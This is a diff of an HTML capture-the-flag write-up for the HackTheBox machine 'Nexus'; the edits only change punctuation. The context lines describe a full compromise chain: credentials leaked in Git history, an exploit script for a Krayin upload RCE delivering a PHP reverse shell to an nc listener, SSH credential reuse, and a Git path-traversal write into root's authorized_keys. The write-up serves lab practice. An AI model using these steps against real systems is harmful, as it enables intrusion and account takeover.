@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Joseph Quintana — Nexus (HackTheBox)</title>
+<title>Joseph Quintana: Nexus (HackTheBox)</title>
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet" />
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/tabler-icons.min.css" />
 <style>
@@ -61,7 +61,7 @@ nav .container { display: flex; align-items: center; justify-content: space-betw
 .content pre { background: var(--surface); border: 1px solid var(--border); border-radius: 6px; padding: 1rem; overflow-x: auto; margin: 1rem 0; }
 .content pre code { color: var(--text); background: none; padding: 0; font-size: 13px; line-height: 1.6; white-space: pre; }
 .content img { width: 100%; border-radius: 6px; border: 1px solid var(--border); margin: 1rem 0; display: block; }
-/* CODE PEEK / EXPAND — shows first 5 lines, toggle sits at the bottom, one shared scrollbar */
+/* CODE PEEK / EXPAND: shows first 5 lines, toggle sits at the bottom, one shared scrollbar */
 .code-clamp { margin: 1rem 0; }
 .code-clamp .code-toggle-checkbox { display: none; }
 .code-clamp .code-scroll {
@@ -135,7 +135,7 @@ footer .container { display: flex; align-items: center; justify-content: space-b
 <div class="content">
 
 <h2>Overview</h2>
-<p>Nexus was an easy Linux box. Vhost enumeration turned up a Gitea instance and a Krayin CRM billing portal. Recovered a leaked <code>.env</code> credential from Git history, reused it to log into Krayin, and Krayin turned out to be vulnerable to an authenticated file-upload RCE. From there, LinPEAS handed over another set of creds that got reused over SSH, and a root-owned systemd timer syncing Gitea templates was the final piece — hand-crafted some Git objects to smuggle a path traversal payload into root's <code>authorized_keys</code>.</p>
+<p>Nexus was an easy Linux box. Vhost enumeration turned up a Gitea instance and a Krayin CRM billing portal. Recovered a leaked <code>.env</code> credential from Git history, reused it to log into Krayin, and Krayin turned out to be vulnerable to an authenticated file-upload RCE. From there, LinPEAS handed over another set of creds that got reused over SSH, and a root-owned systemd timer syncing Gitea templates was the final piece: hand-crafted some Git objects to smuggle a path traversal payload into root's <code>authorized_keys</code>.</p>
 
 <h2>Recon</h2>
 <p>Started with a service/default NSE script nmap scan, as with any box.</p>
@@ -155,13 +155,13 @@ footer .container { display: flex; align-items: center; justify-content: space-b
 <p>After running a gobuster vhost brute force, got some further useful findings. Added the domains to <code>/etc/hosts</code>.</p>
 <pre><code>gobuster vhost -u nexus.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain</code></pre>
 <img src="https://i.imgur.com/lv1UVUZ.png" alt="Gobuster vhost results revealing git.nexus.htb and billing.nexus.htb" />
-<p>Billing then takes us to this admin login portal — Krayin, an open-source CRM.</p>
+<p>Billing then takes us to this admin login portal, Krayin, an open-source CRM.</p>
 <img src="https://i.imgur.com/cpf0ELK.png" alt="the Krayin admin login portal" />
 
 
 <p>Git page takes us to a git service. found there was a link to a git repo.</p>
 <img src="https://i.imgur.com/Nl3yEPS.png" alt="admin's public krayin-docker-setup repository on Gitea" />
-<p>Upon inspection, some credentials were found, but not anything particularly of interest — the <code>DB_PASSWORD</code> field was blank. Decided to git clone it to see if we could retrieve any credentials that might have previously been in the git repo.</p>
+<p>Upon inspection, some credentials were found, but not anything particularly of interest: the <code>DB_PASSWORD</code> field was blank. Decided to git clone it to see if we could retrieve any credentials that might have previously been in the git repo.</p>
 <pre><code>git clone http://git.nexus.htb/admin/krayin-docker-setup
 cd krayin-docker-setup
 git log --all -p | grep -i "password\|api_key\|secret\|token"</code></pre>
@@ -175,7 +175,7 @@ git log --all -p | grep -i "password\|api_key\|secret\|token"</code></pre>
 <img src="https://i.imgur.com/2QfMsJ3.png" alt="Logging into Krayin and landing on the dashboard" />
 <p>Credentials worked!</p>
  <img src="https://i.imgur.com/vbysExG.png" alt="Krayin dashboard"/> 
-<p>Upon searching the version of Krayin, it seems this version had a CVE — <strong>CVE-2026-38526 / EDB-ID 52629</strong>, an authenticated RCE. Krayin uses TinyMCE for rich-text fields, and TinyMCE's in-editor image upload hits a server-side endpoint meant to accept only images. The file-type validation on that endpoint isn't strict enough to block a <code>.php</code> upload, and uploaded files land directly under the web-accessible <code>storage/tinymce/</code> directory — so any authenticated user can upload a PHP web shell through what's meant to be an image uploader, then just browse to the returned path to get code execution.</p>
+<p>Upon searching the version of Krayin, it seems this version had a CVE: <strong>CVE-2026-38526 / EDB-ID 52629</strong>, an authenticated RCE. Krayin uses TinyMCE for rich-text fields, and TinyMCE's in-editor image upload hits a server-side endpoint meant to accept only images. The file-type validation on that endpoint isn't strict enough to block a <code>.php</code> upload, and uploaded files land directly under the web-accessible <code>storage/tinymce/</code> directory, so any authenticated user can upload a PHP web shell through what's meant to be an image uploader, then just browse to the returned path to get code execution.</p>
 <p>From here, downloaded the python POC and ran it against the billing subdomain with the payload being a PHP reverse shell by Pentest Monkey.</p>
 <pre><code>python3 52629.py -t http://billing.nexus.htb -u j.matthew@nexus.htb -p 'N27xh!!2ucY04' -f php-reverse-shell.php
 
@@ -190,14 +190,14 @@ nc -lvnp 4444</code></pre>
 <img src="https://i.imgur.com/pZMg8GX.png" alt="LinPEAS running on the target as www-data" />
 <img src="https://i.imgur.com/PyEsPIs.png" alt="LinPEAS returning credentials" />
 
-<p>Linpeas returned credentials. Tried sshing with those credentials for the <code>krayin</code> user, but had no luck — let's try <code>jones</code>.</p>
+<p>Linpeas returned credentials. Tried sshing with those credentials for the <code>krayin</code> user, but had no luck, so let's try <code>jones</code>.</p>
 <pre><code>ssh jones@10.129.89.28
 cat user.txt
 8a3fdb05504c0a99754de6b9dee757e0</code></pre>
 <img src="https://i.imgur.com/4F9VZcK.png" alt="SSH login as jones and reading the user flag" />
 <p>It worked with jones! Here we get our user flag.</p>
 
-<p>Upon taking a look at the previous linpeas output again, this service seemed interesting and could possibly give us the privilege escalation we need — a systemd timer, <code>gitea-template-sync.timer</code>, running <code>/etc/gitea/template-sync.py</code> as <strong>root</strong>. The script walks any Gitea repo flagged <code>template:true</code> and copies its tracked files into a staging directory.</p>
+<p>Upon taking a look at the previous linpeas output again, this service seemed interesting and could possibly give us the privilege escalation we need: a systemd timer, <code>gitea-template-sync.timer</code>, running <code>/etc/gitea/template-sync.py</code> as <strong>root</strong>. The script walks any Gitea repo flagged <code>template:true</code> and copies its tracked files into a staging directory.</p>
 <img src="https://i.imgur.com/SZXsS6n.png" alt="Discovering the root-owned gitea-template-sync systemd timer" />
 <p>Below is the vulnerable code:</p>
 <div class="code-clamp">
@@ -387,7 +387,7 @@ curl -X POST http://git.nexus.htb/api/v1/users/jones/tokens \
 <label for="code-3" class="toggle-line"><span class="chevron">▸</span><span class="label-more">Show 5 more lines</span><span class="label-less">Show less</span></label>
 </div>
 
-<p>Created the malicious git repo, then found a script that'll allow for directory traversal — writes blob/tree/commit objects directly into <code>.git/objects/</code>, chains <code>..</code> tree entries around the <code>authorized_keys</code> blob, and manually points <code>refs/heads/main</code> at the crafted commit:</p>
+<p>Created the malicious git repo, then found a script that'll allow for directory traversal: writes blob/tree/commit objects directly into <code>.git/objects/</code>, chains <code>..</code> tree entries around the <code>authorized_keys</code> blob, and manually points <code>refs/heads/main</code> at the crafted commit:</p>
 
 <div class="code-clamp">
 <input type="checkbox" id="code-4" class="code-toggle-checkbox">
